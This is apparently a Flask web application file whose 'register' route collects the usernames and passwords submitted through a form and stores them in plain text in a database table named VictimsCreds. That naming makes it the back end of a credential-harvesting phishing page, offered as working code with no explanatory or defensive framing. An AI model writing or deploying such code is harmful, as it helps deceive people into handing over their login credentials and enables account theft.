from flask.helpers import url_for
from app import app, db
from flask import render_template, request, redirect
from db import VictimsCreds

@app.route("/")
def index():
    return render_template('index.html')
@app.route("/register", methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        victimCreds = VictimsCreds(username=username, password=password)
        db.session.add(victimCreds)
        db.session.commit()
        return redirect(url_for('register'))
    return render_template('register.html')
if __name__ == '__main__':
    app.run()